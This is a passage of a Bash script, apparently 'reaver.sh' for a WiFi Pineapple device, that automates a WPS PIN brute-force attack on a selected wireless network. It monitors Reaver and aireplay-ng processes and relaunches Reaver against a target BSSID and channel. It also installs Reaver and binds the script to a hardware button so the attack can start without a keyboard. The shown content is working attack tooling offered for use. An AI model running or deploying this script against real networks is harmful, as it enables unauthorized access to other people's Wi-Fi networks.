				echo "   [!] Aireplay-ng relaunch limit reached."
				if [[ $Output_File ]]; then
					echo "   [!] Aireplay-ng relaunch limit reached." >> $Output_File
				fi
				fnLED_Toggle flash
			fi
		fi
	fi
	unset tmppid tmplines
}

#----------------------------------------------------------------------------
# Checking to see if Reaver is running properly
#----------------------------------------------------------------------------
fnReaver_Check() {
	tmppid=`ps -ef | grep -v grep | grep -v xterm | grep -i "reaver" | grep -v "reaver.sh" | awk '{ print $1 }'`
	if [[ $tmppid && $tmppid == $Reaver_PID ]]; then
		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: Reaver running check successful"
			if [[ $Output_File ]]; then
				echo "DEBUG: Reaver running check successful" >> $Output_File
			fi
		fi
		
		tmplines=`cat $Reaver_Output | wc -l`
		if [[ $tmplines -eq $Reaver_lines ]]; then
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: No new lines in Reaver output"
				if [[ $Output_File ]]; then
					echo "DEBUG: No new lines in Reaver output" >> $Output_File
				fi
			fi
			((alert++))
		else
			Reaver_lines=$tmplines
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: NumLines check successful"
				echo "DEBUG: Current number of lines in reaver output: $Reaver_lines"
				if [[ $Output_File ]]; then
					echo "DEBUG: NumLines check successful" >> $Output_File
					echo "DEBUG: Current number of lines in reaver output: $Reaver_lines" >> $Output_File
				fi
			fi
			linecheck=$(tail -n 1 $Reaver_Output | cut -c -18)
			if [[ "$linecheck" == "$LastLine" ]]; then
				if [[ $Debug -eq 1 ]]; then
					echo "DEBUG: Last line is same as current one"
					if [[ $Output_File ]]; then
						echo "DEBUG: Last line is same as current one" >> $Output_File
					fi
				fi
				((alert++))
			else
				LastLine=$linecheck
				if [[ $Debug -eq 1 ]]; then
					echo "DEBUG: Last line check successful"
					echo "DEBUG: Last line: \"$LastLine\""
					if [[ $Output_File ]]; then
						echo "DEBUG: Last line check successful" >> $Output_File
						echo "DEBUG: Last line: \"$LastLine\"" >> $Output_File
					fi
				fi
					#Add other Reaver checks here
			fi
		fi
	
	else
		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: Reaver has quit"
			if [[ $Output_File ]]; then
				echo "DEBUG: Reaver has quit" >> $Output_File
			fi
		fi
		unset Reaver_PID
	fi

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Finished reaver checks. $alert alerts"
		if [[ $Output_File ]]; then
			echo "DEBUG: Finished reaver checks. $alert alerts" >> $Output_File
		fi
	fi

	if [[ $quit -eq 1 ]]; then
		unset Reaver_PID
	elif [[ $alert -ne 0 ]]; then
		((reaver_checks++))
		if [[ $reaver_checks -ge $Alert_Threshold ]]; then
			((reaver_relaunch++))
			if [[ $reaver_relaunch -le $Relaunch_Limit ]]; then
				if [[ $Debug -eq 1 ]]; then
					echo "DEBUG: Alert threshold reached. Restarting Reaver"
					if [[ $Output_File ]]; then
						echo "DEBUG: Alert threshold reached. Restarting Reaver" >> $Output_File
					fi
				fi	
				reaver_checks=0
				if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "reaver" | grep -v "reaver.sh" | awk '{ print $1 }') -eq $Reaver_PID ]]; then
					kill $Reaver_PID
					sleep 2
					reaver -i mon0 -A -a -b ${BSSID[$choice]} -c ${Channel[$choice]} -o $Reaver_Output >/dev/null 2>&1 &
					sleep 3
					Reaver_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "reaver" | grep -v "reaver.sh" | awk '{ print $1 }'`

					if ! [[ $Reaver_PID ]]; then
						echo -e "   [!] Failed To Relaunch Reaver!"
						if [[ $Output_File ]]; then
							echo -e "   [!] Failed To Relaunch Reaver!" >> $Output_File
						fi
						fnLED_Toggle flash
					fi 
					if [[ $Debug -eq 1 ]]; then
						echo "DEBUG: new PID of Reaver: $Reaver_PID"
						if [[ $Output_File ]]; then
							echo "DEBUG: new PID of Reaver: $Reaver_PID" >> $Output_File
						fi
					fi

					sleep 30 & Sleep_PID=$!; wait $Sleep_PID; unset Sleep_PID
					Reaver_lines=`cat $Reaver_Output | wc -l`
					LastLine=$(tail -n 1 $Reaver_Output | cut -c -18)
				else
					echo "   [!] Reaver seems to have changed PIDs"
					if [[ $Output_File ]]; then
						echo "   [!] Reaver seems to have changed PIDs" >> $Output_File
					fi
					fnLED_Toggle flash
				fi
			else
				echo "   [!] Reaver relaunch limit reached."
				if [[ $Output_File ]]; then
					echo "   [!] Reaver relaunch limit reached." >> $Output_File
				fi
				fnLED_Toggle flash
			fi
		fi
	fi
	
	unset tmppid tmplines linecheck
}

#----------------------------------------------------------------------------
# Installation
#----------------------------------------------------------------------------
fnInstall() {
	echo -e "Do you want to run this script from the WPS button \n(WARNING: THIS WILL OVERWRITE CURRENT SETTINGS) [y]? \c"
	read Selection
	if [[ $Selection == '' ]]; then 
		WPS_Button=1
	else
		case $Selection in
		y|Y|YES|yes|Yes) WPS_Button=1 ;;
		n|N|no|NO|No)
		WPS_Button=0 ;;
		*) echo -e "Invalid choice. Nothing will be changed."; WPS_Button=0; sleep 3;;
		esac
	fi
	unset Selection

	echo ""

	if [[ ! $(which reaver) ]]; then
		Reaver_Install=1
		if [[ `df -k | grep rootfs | awk {'print $4'}` -gt 220 && `df -k | grep "/usb"` ]]; then
			echo -e "Do you want to install Reaver (I)nternally or to (U)SB [I]? \c"
			read Selection
			if [[ $Selection == '' ]]; then 
				Location='internal'
			else
				case $Selection in
				u|U) Location='USB' ;;
				i|I) Location='internal' ;;
				*) echo -e "Invalid choice. Defaulting to internal."; Location='internal'; sleep 3;;
				esac
			fi
			unset Selection
		elif [[ `df -k | grep rootfs | awk {'print $4'}` -gt 220 ]]; then
			echo "USB not found. Installing Reaver internally"
			Location='internal'
			sleep 2
		elif [[ `df -k | grep "/usb"` ]]; then
			echo "Lack of internal space. Installing Reaver to USB"
			Location='USB'
			sleep 2
		else
			echo -e "No USB found and not enough internal space. Free up some space and/or\ninstall a USB flash drive and try again"
			exit 1
		fi
		echo ""
	else
		Reaver_Install=0
		echo "Reaver already installed. Skipping."
	fi

	if [[ $Reaver_Install -eq 1 ]]; then
		echo -e "[+] Installing Reaver"
		echo -e "   [+] Checking internet connectivity"
		ping -c 3 google.com >/dev/null
		rc=$?
		if [[ $rc -ne 0 ]]; then
			echo -e "   [!] Failed! Please check internet connectivity and try again.\n\n"
			exit 1
		fi
		echo -e "   [+] Updating OPKG"
		opkg update >/dev/null 2>&1
		rc=$?
		if [[ $rc -ne 0 ]]; then
			echo "   [!] OPKG Failed with error code $rc"
			exit 1
		fi
		unset rc
		echo "   [+] Installing Reaver to $Location"
		Location=`echo $Location | tr '[A-Z]' '[a-z]'`
		if [[ "$Location" == "usb" ]]; then
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: Installing Reaver to USB"
			fi
			opkg install --dest usb reaver >/dev/null 2>&1
			rc=$?
		elif [[ "$Location" == "internal" ]]; then
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: Installing Reaver to USB"
			fi
			opkg install reaver >/dev/null 2>&1
			rc=$?
		else
			echo "   [!] Error installing Reaver!"
			fnLED_Toggle flash
		fi
		if [[ $rc -ne 0 ]]; then
			echo "   [!] OPKG Failed with error code $rc"
			exit 1
		fi
	fi

	if [[ $WPS_Button -eq 1	]]; then
		echo "[+] Configuring WPS button launch script"
		echo "   [+] Generating script"
		#echo "cd /root" >> /etc/pineapple/wpsScript.sh
		#echo "# WARNING! THE \"&\" MUST REMAIN AT THE END TO ENABLE PROPER FUNCTION!" >> /etc/pineapple/wpsScript.sh
		echo "bash /root/reaver.sh" > /etc/pineapple/wpsScript.sh

		echo "   [+] Configuring button"
		uci set system.@button[1].button=reset
		uci set system.@button[1].action=released
		uci set system.@button[1].handler="sh /etc/pineapple/wpsScript.sh"
		uci set system.@button[1].min=0
		uci set system.@button[1].max=2
		uci commit system
	fi

	echo -e "\n\nInstallation complete. Launch by typing \"./reaver.sh\"\nor type \"./reaver.sh -h\" for more options"
	if [[ $WPS_Button -eq 1	]]; then
		echo -e "\nTo modify how reaver.sh launches from the WPS button\nedit /etc/pineapple/wpsScript.sh"
	fi
	echo -e "\n"
	exit 0
}

#------------------------------------
# Launcher
#------------------------------------
#Checking for blacklist
if [[ -f /root/blacklist.txt ]]; then
	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: blacklist.txt found. Loading networks to skip"
	fi
	count=0
	numlines=`cat "/root/blacklist.txt" | wc -l`
	i=1	
	
	while [[ $i -le "$numlines" ]]; do
		#Blacklist_ESSID[$count]=`awk -v k=$i 'FNR == k {print $1}' "/root/blacklist.txt"`
		Blacklist_BSSID[$count]=`awk -v k=$i 'FNR == k {print $2}' "/root/blacklist.txt"`
		((count++))
		((i++))
	done
	
	NumBlacklist="${#Blacklist_BSSID[@]}"
	unset i count numlines
	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: $NumBlacklist networks loaded from cracked.txt"
		sleep 3
	fi
fi

clear

#Check for install
if [[ $Install -eq 1 ]]; then
	fnInstall
fi

# Sanity checks
if ! [[ $(which reaver) ]]; then
	echo "Error! Reaver not found. Type \"./reaver.sh -h\" for help on how to install"
	exit 1
elif ! [[ $(which aireplay-ng) ]]; then
	echo "Error! Aireplay-ng not found. Exiting script"
	exit 1
elif [[ -f /etc/pineapple/pineapple_version ]]; then
	if [[ `cat /etc/pineapple/pineapple_version` != "3.0.0" ]]; then
		FWver=`cat /etc/pineapple/pineapple_version`
		echo "Warning! This script has been tested on FW version 3.0.0"
		echo "Your current version is $FWver"
		echo -e "If you experience any problems please try upgrading your pineapple first\n"
	fi
	echo "Reaver.sh version $version"
	echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
else
	echo "Unable to determine FW version. Try upgrading to 3.0.0 and trying again."
	exit 1
fi

#Reset LED
echo default-on > $LED
echo none > $LED

sleep 2

if [[ $TimeDelay ]]; then
	echo "[+] Time delay detected. wait $TimeDelay seconds before starting"
	if [[ $Output_File ]]; then
		echo "[+] Time delay detected. wait $TimeDelay seconds before starting" >> $Output_File
	fi
	fnDelay
fi
fnPhase1
fnPhase2
fnPhase3
